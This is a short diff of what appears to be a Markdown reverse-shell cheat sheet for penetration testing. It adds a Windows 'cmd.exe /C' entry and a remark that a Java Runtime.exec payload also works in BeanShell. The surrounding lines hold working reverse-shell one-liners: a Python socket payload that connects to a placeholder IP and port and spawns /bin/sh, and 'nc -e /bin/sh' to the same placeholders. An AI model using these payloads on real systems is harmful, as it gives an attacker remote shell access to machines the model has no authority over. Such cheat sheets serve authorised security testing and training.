@@ -25,6 +25,11 @@ reinitialize the terminal with `reset`.
 
 ## On the remote server
 
+### Windows
+```bash
+> cmd.exe /C <cmd>
+```
+
 ### Python
 ```bash
 python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"{IP}\\",{Port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);\'
@@ -44,6 +49,9 @@ nc -e /bin/sh {IP} {PORT}
 ```java
 r = Runtime.getRuntime();p = r.exec(["your payload"] as String[]);p.waitFor()
 ```
+
+This payload can also work with `BeanShell` scripts.
+
 
 ### PHP
 ```bash
